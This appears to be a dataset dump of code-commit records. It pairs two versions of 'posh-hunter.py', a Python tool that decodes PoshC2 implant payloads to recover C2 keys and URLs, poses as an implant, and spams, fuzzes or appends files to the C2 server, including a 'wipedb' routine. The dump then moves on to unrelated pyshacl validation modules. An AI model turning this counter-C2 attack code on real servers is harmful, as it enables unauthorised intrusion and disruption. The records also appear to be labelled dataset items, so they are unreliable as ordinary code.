    print 'Wiping their DB...'
    self.uploadfile( None, '..\PowershellC2.SQLite', 'Appended data' )
    self.uploadfile( None, '..\oops.txt', 'oopsy' )
    self.uploadfile( None, '..\Restart-C2Server.lnk', 'oopsy' )

  # Listen to incoming commands
  def listen( self, url ):
    print 'Listening to server on comms URL: ' + url
    fmt = '%Y-%m-%d %H:%M:%S'
    while True:
      self.setcookie( '' )
      data = self.do_request( url )
      if len( data.strip() ) > 0:
        try:
          cmd = self.decrypt( data )
        except:
          print 'Decrypting response failed: ' + data
        out = ''
        if 'fvdsghfdsyyh' in cmd:
          out = 'No command...'
        elif '!d-3dion@LD!-d' in cmd:
          out = '\n'.join(cmd.split('!d-3dion@LD!-d'))
        else: 
          out = cmd
      else:
        out = 'No command...'

      print datetime.datetime.now().strftime(fmt) + ': ' + out
      time.sleep( self.sleeptime )
    return False

  # rickroll the server
  def rickroll( self, url ):
    thisdir = os.path.dirname(os.path.realpath(__file__))
    wordsfile = thisdir + '/nevergonna.txt'
    self.username = 'rastley'
    self.domain = 'SAW'
    self.host = 'https://bitly.com/98K8eH'
    self.spam( wordsfile, url )
 
  # Spray the contents of a txt file at the server as machine names
  def spam( self, wordsfile, url ):
    try:
      with open( wordsfile, 'r' ) as f:
        lines = f.readlines()
    except:
      print 'Failed to open ' + wordsfile
      return False

    for line in lines:
      line = line.strip() # re.sub( '[^-0-9a-zA-Z ]', '', line.strip() ).replace(' ','-')
      self.machine = line
      key = self.key
      self.secondstage( url )
      self.pid = None
      self.key = key
    return True
  
  # Connect with random keys, forever
  def fuzz( self, secondstage ):
    import random
    while True:
      c = b''
      for i in range( 0, 16 ):
        c += unichr( random.randint(0, 127 ) )
      self.key = base64.b64encode( c )
      self.secondstage( secondstage )

        

def main():
  
  # Command line options
  parser = argparse.ArgumentParser(description=""Find, monitor and troll a PoshC2 server"")
  parser.add_argument(""-a"", ""--analyse"", help=""Analyse an implant payload to discover C2 server"")
  parser.add_argument(""-k"", ""--key"", help=""Comms encryption key"" )
  parser.add_argument(""-U"", ""--useragent"", help=""User-agent string"" )
  parser.add_argument(""-r"", ""--referer"", help=""Referer string"" )
  parser.add_argument(""-H"", ""--host"", help=""Host name to connect to"" )
  parser.add_argument(""-g"", ""--hostheader"", help=""Host header for domain fronted servers"")
  parser.add_argument(""-d"", ""--domain"", default='WORKGROUP', help=""Windows domain name to claim to be in"")
  parser.add_argument(""-u"", ""--user"", default='user', help=""Windows user to claim to be connecting as"")
  parser.add_argument(""-m"", ""--machine"", default='DESKTOP', help=""Machine hostname to claim to be connecting as"")
  parser.add_argument(""--connect"", action='store_true', help=""Connect to the C2 as a new implant then quit"")
  parser.add_argument(""--watch"", action='store_true', help=""Connect and monitor commands as they come in"")

  parser.add_argument(""--spam"", metavar=""TEXTFILE"", help=""Spam the connected implants screen with content from this text file"")
  parser.add_argument(""--rickroll"", action='store_true', help=""Spam with the entire lyrics to Never Gonna Give You Up"")
  parser.add_argument(""--upload"", nargs=2, help=""Upload a file to the C2 server (NOTE: this writes data from the local file to the remote file in APPEND mode)"")
  parser.add_argument(""--fuzz"", action='store_true', help=""Fuzz with random bytes"")
  if len( sys.argv)==1:
    parser.print_help()
    sys.exit(1)
  args = parser.parse_args()

  if args.analyse:
    payload = PoshC2Payload( args.analyse )   
    c2 = payload.analyse()
    secondstage = payload.secondstage
  else:
    c2 = PoshC2Server()
    c2.useragent = args.useragent
    c2.referer = args.referer
    c2.key = args.key
    c2.host = args.host
  c2.domain = args.domain
  c2.username = args.user
  c2.machine = args.machine

  if args.connect:
    c2.secondstage( secondstage )
    return True

  if args.watch:
    c2.secondstage( secondstage, interact=True )
    return True

  if args.rickroll:
    c2.rickroll( payload.secondstage )
    return True

  if args.upload:
    c2.secondstage( secondstage )
    c2.uploadfile( args.upload[0], args.upload[1] ) 

  if args.fuzz:
    c2.fuzz( secondstage )

if __name__ == ""__main__"":
  main()
/n/n/n",0
181,e523c6418720a20eb247111d21424752f6994ee0,"/posh-hunter.py/n/n#!/usr/bin/env python
# Find, monitor and troll a PoshC2 server

import zlib, argparse, os, sys, re, requests, subprocess, datetime, time, base64

class PoshC2Payload:
  
  filepath = None
  useragent = None
  secondstage = None
  encryptionkey = None

  def __init__( self, path ):
    if not os.path.isfile( path ):
      print path + ' isn\'t a file'

    self.filepath = path

  # Attempt to pull info out of implant payload
  def analyse( self ):
    print 'Analysing ' + self.filepath + '...'

    with open( self.filepath, 'rb' ) as f:
      decoded = PoshC2Payload.base64_walk( f.read() )
  
    # print decoded

    # Get custom headers
    headernames = [
      'User-Agent',
      'Host',
      'Referer'
    ]
    self.headers = {}
    for h in headernames:
      m = re.search( h + '"",""([^""]*)""', decoded, re.IGNORECASE )
      if m:
        print h + ': ' + m.group(1)
        self.headers[h] = m.group(1)

    # Get host header
    m = re.search('\$h=""([^""]*)""', decoded )
    if m:
      self.headers['Host'] = m.group(1)
      print 'Host header: ' + m.group(1)

    # Get second stage URL
    m = re.search('\$s=""([^""]*)""', decoded )
    if m:
      self.secondstage = m.group(1)
      print 'Second stage URL: ' + self.secondstage
    
    # Get encryption key
    m = re.search('-key ([/+a-z0-9A-Z]*=*)', decoded )
    if m:
      self.encryptionkey = m.group(1)
      print 'Encryption key: ' + self.encryptionkey

    c2 = PoshC2Server()
    c2.key = self.encryptionkey
    return c2

  # Recursively attempt to extract and decode base64
  @staticmethod
  def base64_walk( data ):

    # data = data.decode('utf-16le').encode('utf-8')

    # Convert by stripping zero bytes, lol
    s = ''
    for c in data:
      if ord( c ) != 0:
        s += c
    data = s
    # print ''
    # print 'Attempting to get data from: ' + data

    # Find all base64 strings
    m = re.findall( r'[+/0-9a-zA-Z]{20,}=*', data )
    
    if len( m ) == 0:
      print 'No more base64 found'
      return data

    # Join into one string
    b64 = ''.join(m)
    # print 'Found: ' + b64
    
    decoded = base64.b64decode( b64 )

    # Deflated?
    decompress = zlib.decompressobj(
      -zlib.MAX_WBITS  # see above
    )
    try:
      d = decompress.decompress( decoded )
      if d:
        print 'Data is compressed'
        decoded = d
    except:
      print 'Data is not compressed'

    # Check if the data now contains a user agent, URL 
    m = re.search(r'user-agent',decoded,re.IGNORECASE)
    if m:
      return decoded
    
    return PoshC2Payload.base64_walk( decoded )


class PoshC2Server:

  host = None
  hostheader = None
  key = None
  useragent = None
  referer = None
  cookie = None
  pid = None
  username = None
  domain = None
  cookies = None
  debug = False
  sleeptime = 5

  def __init__( self, host=None, hostheader=None ):
    
    self.session = requests.Session()
    self.host = host
    if not hostheader:
      self.hostheader = host
    else:
      self.hostheader = hostheader

  def do_request( self, url, data=None ):
    
    # def do_request( self, path, method='GET', data=None, files=None, returnformat='json', savefile=None ):
    headers = {
      'Host': self.hostheader,
      'Referer': self.referer,
      'User-Agent': self.useragent,
      'Cookie': self.cookie
    }
    if len(self.session.cookies) > 0:
      cookies = requests.utils.dict_from_cookiejar(self.session.cookies)
      cookies['SessionID'] = self.cookie
      print 'Including cookies'
      print self.cookie

    try:
      if data:
        response = self.session.post(url, data=data, headers=headers, verify=False ) # , files=files, stream=stream )
      else:
        response = self.session.get(url, headers=headers, verify=False )
    except:
      e = sys.exc_info()[1]
      print 'Request failed: ' + str( e ), 'fail' 
      return False

    if self.debug: 
      print response
      print response.text   
    if response.status_code == 200:
      return response.text
    self.error = response
    if self.debug:
      print self.error
    return False

  def get_encryption( self, iv='0123456789ABCDEF' ):
    from Crypto.Cipher import AES
    aes = AES.new( base64.b64decode(self.key), AES.MODE_CBC, iv )
    return aes

  # Encrypt a string and base64 encode it
  def encrypt( self, data, gzip=False ):
    # function ENC ($key,$un){
    # $b = [System.Text.Encoding]::UTF8.GetBytes($un)
    # $a = CAM $key
    # $e = $a.CreateEncryptor()
    # $f = $e.TransformFinalBlock($b, 0, $b.Length)
    # [byte[]] $p = $a.IV + $f
    # [System.Convert]::ToBase64String($p)
    # }

    if gzip:
      print 'Gzipping data - pre-zipped len, ' + str(len(data))
      import StringIO
      import gzip
      out = StringIO.StringIO()
      with gzip.GzipFile(fileobj=out, mode=""w"") as f:
        f.write(data)
      data = out.getvalue() 

    # Pad with zeros
    mod = len(data) % 16
    if mod != 0:
      newlen = len(data) + (16-mod)
      data = data.ljust( newlen, '\0' )
    aes = self.get_encryption()
    # print 'Data len: ' + str(len(data))
    data = aes.IV + aes.encrypt( data )
    if not gzip:
      data = base64.b64encode( data )
    return data

  # Decrypt a string from base64 encoding 
  def decrypt( self, data, gzip=False ):
    # iv is first 16 bytes of cipher
    iv = data[0:16]
    # data = data[16:]
    # print 'IV length: ' + str(len(iv))
    aes = self.get_encryption(iv)
    if not gzip:
      data = base64.b64decode(data)
    data =  aes.decrypt( data )
    if gzip:
      print 'Gunzipping data - pre-zipped len, ' + str(len(data))
      import StringIO
      import gzip
      infile = StringIO.StringIO(data)
      with gzip.GzipFile(fileobj=infile, mode=""r"") as f:
        data = f.read()
    return data[16:]
  
  def setcookie( self, value=None ):
    if value:
      c = value
    else:
    # $o=""$env:userdomain\$u;$u  ;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;http://172.16.88.221""
      if not self.pid:
        import random
        self.pid = random.randrange(300,9999)
      c = self.domain + '\\'
      c += self.username + ';'
      c += self.username + ';' 
      c += self.machine + ';AMD64;' 
      c += str( self.pid ) + ';' 
      c += self.host
    print c
    self.cookie = 'SessionId=' + self.encrypt( c )
    print self.cookie

  # Get the second stage
  def secondstage( self, url, interact=False ):
    
    # $o=""$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;https://172.16.88.221""
    # $pp=enc -key sBOGMbI+wTzxiN9H8q8y8YFBuD/KGsmvCnwRhDjPVXE= -un $o
    # $primer = (Get-Webclient -Cookie $pp).downloadstring($s)
    self.host = '/'.join(url.split('/')[0:3])
    self.setcookie()
    data = self.do_request( url )
    data = self.decrypt( data )

    # print data

    # Get encryption key, URL
    m = re.search( r'\$key *= *""([^""]+)""', data )
    if m:
      print 'Comms encryption key: ' + m.group(1)
      self.key = m.group(1)
    m = re.search(r'\$Server *= *""([^""]+)""', data )
    if m:
      print 'Comms URL: ' + m.group(1)
      self.commsurl = m.group(1)
    m = re.search(r'\$sleeptime *= *([0-9]+)', data )
    if m:
      print 'Sleep time: ' + m.group(1)
      self.sleeptime = int(m.group(1))

    if not interact: return True
    
    self.listen( self.commsurl )

  def getimgdata( self, data ):
    # Just use one image because we don't care
    imagebytes = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAACAUlEQVR42rWXi7WCMAyG2xGcRUfQEXAE7wgyAq7gCDqCjiCruAK3f2162pDSlkfOQaRA8+VPH0Grehvw03WdvXi/3/Y4Ho/+Gv9xtG2rc51lH+DOjanT6eSd4RpGba/Xy55vtxsAsj5qAKxzrbV3ajvQvy5IETiV7kMRAzzyNwuA5OYqhE6pDUrgGSgDlTiECGCiGSi3rN1G+HGdt78OI6AUFKWJj40IwNwcSK7r9Rq9TJFwKFgI1JlIDyxNHCJUIQSI3kC0HIIbYPq+H4GRcy2AuDERAyByKbISiJSFuZ8EQL7ddBEtJWXOdCINI4BU9EtVKAZQLPfcMCC5jCXGFybJ+aYABMHUFReizQAiR0L0tmGrMVAMMDULaEHiK92qAO4spgHSr+G8BCCCWDPyGgALsWbUcwD8TgibGpykVOkMkbZiEWDChtEm83dQ+t5nl2tpG14MUKMCnne1xDIAGhvcIXY+bMuPxyMJkPJVCmBD/5jj7g5uTdMkX34+n/NqQlqkQukv7t5F1VlbC0DlGZcbAwptkB1WOmNS/lIAQziyQ6dQpHR/OJ/Par/f+2epok7VhKJzihSd2OlnBoI+zK+UCIR8j1bC7/erdrvdKHqCqVGgBMIDSDkPo59rmAHSDKGiNdqMuKxh9HMs9z5U8Ntx6ktmSTkmfeCIALmqaEv7B/CgdPivPO+zAAAAAElFTkSuQmCC')     
    maxbyteslen = 1500
    maxdatalen = 1500 + len( data )
    imagebyteslen = len(imagebytes)
    paddingbyteslen = maxbyteslen - imagebyteslen
    bytepadding = '.'.ljust(paddingbyteslen,'.')
    imagebytesfull = imagebytes + bytepadding + data
    return imagebytesfull

  def uploadfile( self, localpath, remotepath, data=None ):
    c = 'download-file '+remotepath
    self.setcookie(c)
    if data:
      filedata = data
    else:
      with open( localpath, 'rb' ) as f:
        filedata = f.read()

  #         $bufferSize = 10737418;
  #             $preNumbers = ($ChunkedByte+$totalChunkByte)
  #             $send = Encrypt-Bytes $key ($preNumbers+$chunkBytes)
    buffersize = 10737418
    filesize = len( filedata )
    chunksize = filesize / buffersize
    import math
    totalchunks = int(math.ceil(chunksize))
    if totalchunks < 1: totalchunks = 1
    totalchunkstr = str( totalchunks ).rjust(5,'0')
    chunk = 1
    start = 0
    while chunk <= totalchunks:
      chunkstr = str( chunk ).rjust(5,'0')
      prenumbers=chunkstr + totalchunkstr
      chunkdata = filedata[start:start+buffersize]
      chunk+=1
      start += buffersize
      send = self.encrypt( prenumbers + chunkdata, gzip=True )
      uploadbytes = self.getimgdata( send )
      print 'Chunk data: ' + chunkdata
      print 'Prenumbers: ' + prenumbers
      print 'Imgdata: ' + uploadbytes
      response = self.do_request( self.commsurl, uploadbytes )
      print response
      if len(response.strip()) > 0:
        print self.decrypt( response )
    return False  

  def wipedb( self ):
    print 'Wiping their DB...'
    self.uploadfile( None, '..\PowershellC2.SQLite', 'Appended data' )
    self.uploadfile( None, '..\oops.txt', 'oopsy' )
    self.uploadfile( None, '..\Restart-C2Server.lnk', 'oopsy' )

  # Listen to incoming commands
  def listen( self, url ):
    print 'Listening to server on comms URL: ' + url
    fmt = '%Y-%m-%d %H:%M:%S'
    while True:
      data = self.do_request( url )
      cmd = self.decrypt( data )
      out = ''
      if 'fvdsghfdsyyh' in cmd:
        out = 'No command...'
      elif '!d-3dion@LD!-d' in cmd:
        out = '\n'.join(cmd.split('!d-3dion@LD!-d'))
      else: 
        out = cmd

      print datetime.datetime.now().strftime(fmt) + ': ' + out
      time.sleep( self.sleeptime )
    return False

  # rickroll the server
  def rickroll( self, url ):
    thisdir = os.path.dirname(os.path.realpath(__file__))
    wordsfile = thisdir + '/nevergonna.txt'
    self.username = 'rastley'
    self.domain = 'SAW'
    self.host = 'https://bitly.com/98K8eH'
    self.spam( wordsfile, url )
 
  # Spray the contents of a txt file at the server as machine names
  def spam( self, wordsfile, url ):
    try:
      with open( wordsfile, 'r' ) as f:
        lines = f.readlines()
    except:
      print 'Failed to open ' + wordsfile
      return False

    for line in lines:
      line = line.strip() # re.sub( '[^-0-9a-zA-Z ]', '', line.strip() ).replace(' ','-')
      self.machine = line
      key = self.key
      self.secondstage( url )
      self.pid = None
      self.key = key
    return True
  
  # Connect with random keys, forever
  def fuzz( self, secondstage ):
    import random
    while True:
      c = b''
      for i in range( 0, 16 ):
        c += unichr( random.randint(0, 127 ) )
      self.key = base64.b64encode( c )
      self.secondstage( secondstage )

        

def main():
  
  # Command line options
  parser = argparse.ArgumentParser(description=""Find, monitor and troll a PoshC2 server"")
  parser.add_argument(""-a"", ""--analyse"", help=""Analyse an implant payload to discover C2 server"")
  parser.add_argument(""-k"", ""--key"", help=""Comms encryption key"" )
  parser.add_argument(""-U"", ""--useragent"", help=""User-agent string"" )
  parser.add_argument(""-r"", ""--referer"", help=""Referer string"" )
  parser.add_argument(""-H"", ""--host"", help=""Host name to connect to"" )
  parser.add_argument(""-g"", ""--hostheader"", help=""Host header for domain fronted servers"")
  parser.add_argument(""-d"", ""--domain"", default='WORKGROUP', help=""Windows domain name to claim to be in"")
  parser.add_argument(""-u"", ""--user"", default='user', help=""Windows user to claim to be connecting as"")
  parser.add_argument(""-m"", ""--machine"", default='DESKTOP', help=""Machine hostname to claim to be connecting as"")
  parser.add_argument(""--connect"", action='store_true', help=""Connect to the C2 as a new implant then quit"")
  parser.add_argument(""--watch"", action='store_true', help=""Connect and monitor commands as they come in"")

  parser.add_argument(""--spam"", metavar=""TEXTFILE"", help=""Spam the connected implants screen with content from this text file"")
  parser.add_argument(""--rickroll"", action='store_true', help=""Spam with the entire lyrics to Never Gonna Give You Up"")
  parser.add_argument(""--upload"", nargs=2, help=""Upload a file to the C2 server (NOTE: this writes data from the local file to the remote file in APPEND mode)"")
  parser.add_argument(""--fuzz"", action='store_true', help=""Fuzz with random bytes"")
  if len( sys.argv)==1:
    parser.print_help()
    sys.exit(1)
  args = parser.parse_args()

  if args.analyse:
    payload = PoshC2Payload( args.analyse )   
    c2 = payload.analyse()
    secondstage = payload.secondstage
  else:
    c2 = PoshC2Server()
    c2.useragent = args.useragent
    c2.referer = args.referer
    c2.key = args.key
    c2.host = args.host
  c2.domain = args.domain
  c2.username = args.user
  c2.machine = args.machine

  if args.connect:
    c2.secondstage( secondstage )
    return True

  if args.watch:
    c2.secondstage( secondstage, interact=True )
    return True

  if args.rickroll:
    c2.rickroll( payload.secondstage )
    return True

  if args.upload:
    c2.secondstage( secondstage )
    c2.uploadfile( args.upload[0], args.upload[1] ) 

  if args.fuzz:
    c2.fuzz( secondstage )

if __name__ == ""__main__"":
  main()
/n/n/n",1
182,10ccd7a692686c72cf3ba4af0c5306acad6a0f56,"pyshacl/constraints/__init__.py/n/n# -*- coding: utf-8 -*-

from .value_constraints import ClassConstraintComponent, DatatypeConstraintComponent, NodeKindConstraintComponent
from .cardinality_constraints import MinCountConstraintComponent, MaxCountConstraintComponent
from .shape_based_constraints import NodeShapeComponent, PropertyShapeComponent

ALL_CONSTRAINT_COMPONENTS = [
    ClassConstraintComponent,
    DatatypeConstraintComponent,
    NodeKindConstraintComponent,
    MinCountConstraintComponent,
    MaxCountConstraintComponent,
    NodeShapeComponent,
    PropertyShapeComponent
]

CONSTRAINT_PARAMETERS_MAP = {p: c for c in ALL_CONSTRAINT_COMPONENTS
                             for p in c.constraint_parameters()}

ALL_CONSTRAINT_PARAMETERS = list(CONSTRAINT_PARAMETERS_MAP.keys())
/n/n/npyshacl/constraints/cardinality_constraints.py/n/n# -*- coding: utf-8 -*-
""""""
https://www.w3.org/TR/shacl/#core-components-count
""""""
import rdflib
from rdflib.term import Literal
from rdflib.namespace import XSD
from pyshacl.constraints.constraint_component import ConstraintComponent
from pyshacl.consts import SH
from pyshacl.errors import ConstraintLoadError

XSD_integer = XSD.term('integer')
SH_minCount = SH.term('minCount')
SH_maxCount = SH.term('maxCount')

SH_MinCountConstraintComponent = SH.term('MinCountConstraintComponent')
SH_MaxCountConstraintComponent = SH.term('MaxCountConstraintComponent')


class MinCountConstraintComponent(ConstraintComponent):
    """"""
    sh:minCount specifies the minimum number of value nodes that satisfy the condition. If the minimum cardinality value is 0 then this constraint is always satisfied and so may be omitted.
    Link:
    https://www.w3.org/TR/shacl/#MinCountConstraintComponent
    Textual Definition:
    If the number of value nodes is less than $minCount, there is a validation result.
    """"""

    def __init__(self, shape):
        super(MinCountConstraintComponent, self).__init__(shape)
        min_count = list(self.shape.objects(SH_minCount))
        if len(min_count) < 1:
            raise ConstraintLoadError(
                ""MinCountConstraintComponent must have at least one sh:minCount predicate."",
                ""https://www.w3.org/TR/shacl/#MinCountConstraintComponent"")
        if len(min_count) > 1:
            raise ConstraintLoadError(
                ""MinCountConstraintComponent must have at most one sh:minCount predicate."",
                ""https://www.w3.org/TR/shacl/#MinCountConstraintComponent"")
        if not shape.is_property_shape:
            raise ConstraintLoadError(
                ""MinCountConstraintComponent can only be present on a PropertyShape, not a NodeShape."",
                ""https://www.w3.org/TR/shacl/#MinCountConstraintComponent"")
        self.min_count = min_count[0]
        if not (isinstance(self.min_count, Literal) and
                self.min_count.datatype == XSD_integer):
            raise ConstraintLoadError(
                ""MinCountConstraintComponent sh:minCount must be a literal with datatype xsd:integer."",
                ""https://www.w3.org/TR/shacl/#MinCountConstraintComponent"")
        if int(self.min_count.value) < 0:
            raise ConstraintLoadError(
                ""MinCountConstraintComponent sh:minCount must be an integer >= 0."",
                ""https://www.w3.org/TR/shacl/#MinCountConstraintComponent"")

    @classmethod
    def constraint_parameters(cls):
        return [SH_minCount]

    @classmethod
    def constraint_name(cls):
        return ""MinCountConstraintComponent""

    @classmethod
    def shacl_constraint_class(cls):
        return SH_MinCountConstraintComponent

    def evaluate(self, target_graph, focus_value_nodes):
        """"""

        :type focus_value_nodes: dict
        :type target_graph: rdflib.Graph
        """"""
        min_count = int(self.min_count.value)
        if min_count == 0:
            # MinCount of zero always passes
            return True, []
        fails = []
        non_conformant = False

        for f, value_nodes in focus_value_nodes.items():
            flag = len(value_nodes) >= min_count
            if not flag:
                non_conformant = True
                fail = self.make_failure(f)
                fails.append(fail)
        return (not non_conformant), fails


class MaxCountConstraintComponent(ConstraintComponent):
    """"""
    sh:maxCount specifies the maximum number of value nodes that satisfy the condition.
    Link: https://www.w3.org/TR/shacl/#MaxCountConstraintComponent
    Textual Definition:
    If the number of value nodes is greater than $maxCount, there is a validation result.
    """"""

    def __init__(self, shape):
        super(MaxCountConstraintComponent, self).__init__(shape)
        max_count = list(self.shape.objects(SH_maxCount))
        if len(max_count) < 1:
            raise ConstraintLoadError(
                ""MaxCountConstraintComponent must have at least one sh:maxCount predicate."",
                ""https://www.w3.org/TR/shacl/#MaxCountConstraintComponent"")
        if len(max_count) > 1:
            raise ConstraintLoadError(
                ""MaxCountConstraintComponent must have at most one sh:maxCount predicate."",
                ""https://www.w3.org/TR/shacl/#MaxCountConstraintComponent"")
        if not shape.is_property_shape:
            raise ConstraintLoadError(
                ""MaxCountConstraintComponent can only be present on a PropertyShape, not a NodeShape."",
                ""https://www.w3.org/TR/shacl/#MaxCountConstraintComponent"")
        self.max_count = max_count[0]
        if not (isinstance(self.max_count, Literal) and
                self.max_count.datatype == XSD_integer):
            raise ConstraintLoadError(
                ""MaxCountConstraintComponent sh:maxCount must be a literal with datatype xsd:integer."",
                ""https://www.w3.org/TR/shacl/#MaxCountConstraintComponent"")
        if int(self.max_count.value) < 0:
            raise ConstraintLoadError(
                ""MaxCountConstraintComponent sh:maxCount must be an integer >= 0."",
                ""https://www.w3.org/TR/shacl/#MaxCountConstraintComponent"")

    @classmethod
    def constraint_parameters(cls):
        return [SH_maxCount]

    @classmethod
    def constraint_name(cls):
        return ""MaxCountConstraintComponent""

    @classmethod
    def shacl_constraint_class(cls):
        return SH_MaxCountConstraintComponent

    def evaluate(self, target_graph, focus_value_nodes):
        """"""

        :type focus_value_nodes: dict
        :type target_graph: rdflib.Graph
        """"""
        max_count = int(self.max_count.value)
        fails = []
        non_conformant = False

        for f, value_nodes in focus_value_nodes.items():
            flag = len(value_nodes) <= max_count
            if not flag:
                non_conformant = True
                fail = self.make_failure(f)
                fails.append(fail)
        return (not non_conformant), fails

/n/n/npyshacl/constraints/constraint_component.py/n/n
""""""
https://www.w3.org/TR/shacl/#core-components-value-type
""""""
import abc
from rdflib import BNode, Graph
from pyshacl.consts import *
import logging

log = logging.getLogger(__name__)

class ConstraintComponent(object, metaclass=abc.ABCMeta):

    def __init__(self, shape):
        self.shape = shape

    @classmethod
    @abc.abstractmethod
    def constraint_parameters(cls):
        return NotImplementedError()

    @classmethod
    @abc.abstractmethod
    def constraint_name(cls):
        return NotImplementedError()

    @classmethod
    @abc.abstractmethod
    def shacl_constraint_class(cls):
        return NotImplementedError()

    @abc.abstractmethod
    def evaluate(self, target_graph, focus_value_nodes):
        return NotImplementedError()

    def make_failure_description(self, severity, focus_node, value_node=None):
        constraint = self.shacl_constraint_class()
        constraint_name = self.constraint_name()
        if severity == SH_Violation:
            severity_desc = ""Constraint Violation""
        else:
            severity_desc = ""Failure""
        desc = ""{} in {} ({}):\n\tShape: {}\n\tFocus Node: {}\n""\
            .format(severity_desc, constraint_name, str(constraint), str(self.shape.node), str(focus_node))
        if value_node is not None:
            desc += ""\tValue Node: {}\n"".format(str(value_node))
        if self.shape.is_property_shape:
            result_path = self.shape.path()
            if result_path is not None:
                desc += ""\tResult Path: {}\n"".format(str(result_path))
        return desc

    def make_failure(self, focus_node, value_node=None):
        constraint = self.shacl_constraint_class()
        severity = self.shape.severity()
        f_triples = list()
        f_node = BNode()
        f_triples.append((f_node, RDF_type, SH_ValidationResult))
        f_triples.append((f_node, SH_sourceConstraintComponent, constraint))
        f_triples.append((f_node, SH_sourceShape, self.shape.node))
        f_triples.append((f_node, SH_resultSeverity, severity))
        f_triples.append((f_node, SH_focusNode, focus_node))
        if value_node:
            f_triples.append((f_node, SH_value, value_node))
        if self.shape.is_property_shape:
            result_path = self.shape.path()
            f_triples.append((f_node, SH_resultPath, result_path))
        desc = self.make_failure_description(severity, focus_node, value_node)
        log.info(desc)
        return desc, f_node, f_triples
/n/n/npyshacl/constraints/shape_based_constraints.py/n/n# -*- coding: utf-8 -*-
""""""
https://www.w3.org/TR/shacl/#core-components-shape
""""""
import rdflib
from pyshacl.constraints.constraint_component import ConstraintComponent
from pyshacl.consts import SH, SH_property, SH_node
from pyshacl.errors import ConstraintLoadError

SH_PropertyShapeComponent = SH.term('PropertyShapeComponent')
SH_NodeShapeComponent = SH.term('NodeShapeComponent')


class PropertyShapeComponent(ConstraintComponent):
    """"""
    sh:property can be used to specify that each value node has a given property shape.
    Link:
    https://www.w3.org/TR/shacl/#PropertyShapeComponent
    Textual Definition:
    For each value node v: A failure MUST be produced if the validation of v as focus node against the property shape $property produces a failure. Otherwise, the validation results are the results of validating v as focus node against the property shape $property.
    """"""

    def __init__(self, shape):
        super(PropertyShapeComponent, self).__init__(shape)
        property_shapes = list(self.shape.objects(SH_property))
        if len(property_shapes) < 1:
            raise ConstraintLoadError(
                ""PropertyShapeComponent must have at least one sh:property predicate."",
                ""https://www.w3.org/TR/shacl/#MinCountConstraintComponent"")
        self.property_shapes = property_shapes

    @classmethod
    def constraint_parameters(cls):
        return [SH_property]

    @classmethod
    def constraint_name(cls):
        return ""PropertyShapeComponent""

    @classmethod
    def shacl_constraint_class(cls):
        return SH_PropertyShapeComponent

    def evaluate(self, target_graph, focus_value_nodes):
        """"""

        :type focus_value_nodes: dict
        :type target_graph: rdflib.Graph
        """"""
        fails = []
        non_conformant = False

        for p_shape in self.property_shapes:
            _nc, _f = self._evaluate_property_shape(p_shape, target_graph, focus_value_nodes)
            non_conformant = non_conformant or _nc
            fails.extend(_f)
        return (not non_conformant), fails

    def _evaluate_property_shape(self, prop_shape, target_graph, f_v_dict):
        fails = []
        non_conformant = False
        prop_shape = self.shape.get_other_shape(prop_shape)
        if not prop_shape or not prop_shape.is_property_shape:
            raise RuntimeError(""Shape pointed to by sh:property does not exist or is not a well-formed SHACL PropertyShape."")
        for f, value_nodes in f_v_dict.items():
            for v in value_nodes:
                _is_conform, _f = prop_shape.validate(target_graph, focus=v)
                non_conformant = non_conformant or (not _is_conform)
                fails.extend(_f)
        return non_conformant, fails


class NodeShapeComponent(ConstraintComponent):
    """"""
    sh:node specifies the condition that each value node conforms to the given node shape.
    Link:
    https://www.w3.org/TR/shacl/#NodeShapeComponent
    Textual Definition:
    For each value node v: A failure MUST be produced if the conformance checking of v against $node produces a failure. Otherwise, if v does not conform to $node, there is a validation result with v as sh:value.
    """"""

    def __init__(self, shape):
        super(NodeShapeComponent, self).__init__(shape)
        node_shapes = list(self.shape.objects(SH_node))
        if len(node_shapes) < 1:
            raise ConstraintLoadError(
                ""NodeShapeComponent must have at least one sh:node predicate."",
                ""https://www.w3.org/TR/shacl/#NodeShapeComponent"")
        self.node_shapes = node_shapes

    @classmethod
    def constraint_parameters(cls):
        return [SH_node]

    @classmethod
    def constraint_name(cls):
        return ""NodeShapeComponent""

    @classmethod
    def shacl_constraint_class(cls):
        return SH_NodeShapeComponent

    def evaluate(self, target_graph, focus_value_nodes):
        """"""

        :type focus_value_nodes: dict
        :type target_graph: rdflib.Graph
        """"""
        fails = []
        non_conformant = False

        for n_shape in self.node_shapes:
            _nc, _f = self._evaluate_node_shape(n_shape, target_graph, focus_value_nodes)
            non_conformant = non_conformant or _nc
            fails.extend(_f)
        return (not non_conformant), fails

    def _evaluate_node_shape(self, node_shape, target_graph, f_v_dict):
        fails = []
        non_conformant = False
        node_shape = self.shape.get_other_shape(node_shape)
        if not node_shape or node_shape.is_property_shape:
            raise RuntimeError(""Shape pointed to by sh:node does not exist or is not a well-formed SHACL NodeShape."")
        for f, value_nodes in f_v_dict.items():
            for v in value_nodes:
                _is_conform, _f = node_shape.validate(target_graph, focus=v)
                # ignore the fails from the node, create our own fail
                if (not _is_conform) or len(_f) > 0:
                    non_conformant = True
                    fail = self.make_failure(f, value_node=v)
                    fails.append(fail)
        return non_conformant, fails/n/n/npyshacl/constraints/value_constraints.py/n/n# -*- coding: utf-8 -*-
""""""
https://www.w3.org/TR/shacl/#core-components-value-type
""""""
import rdflib
from datetime import date, time, datetime
from rdflib.term import Literal
from rdflib.namespace import RDF, XSD
from pyshacl.constraints.constraint_component import ConstraintComponent
from pyshacl.consts import SH, RDFS_subClassOf, RDF_type,\
    SH_IRI, SH_BlankNode, SH_Literal, SH_IRIOrLiteral, SH_BlankNodeOrIRI,\
    SH_BlankNodeORLiteral
from pyshacl.errors import ConstraintLoadError

RDF_langString = RDF.term('langString')
XSD_string = XSD.term('string')
XSD_integer = XSD.term('integer')
XSD_float = XSD.term('float')
XSD_boolean = XSD.term('boolean')
XSD_date = XSD.term('date')
XSD_time = XSD.term('time')
XSD_dateTime = XSD.term('dateTime')

SH_class = SH.term('class')
SH_datatype = SH.term('datatype')
SH_nodeKind = SH.term('nodeKind')
SH_ClassConstraintComponent = SH.term('ClassConstraintComponent')
SH_DatatypeConstraintComponent = SH.term('DatatypeConstraintComponent')
SH_NodeKindConstraintComponent = SH.term('NodeKindConstraintComponent')

class ClassConstraintComponent(ConstraintComponent):
    """"""
    The condition specified by sh:class is that each value node is a SHACL instance of a given type.
    Link:
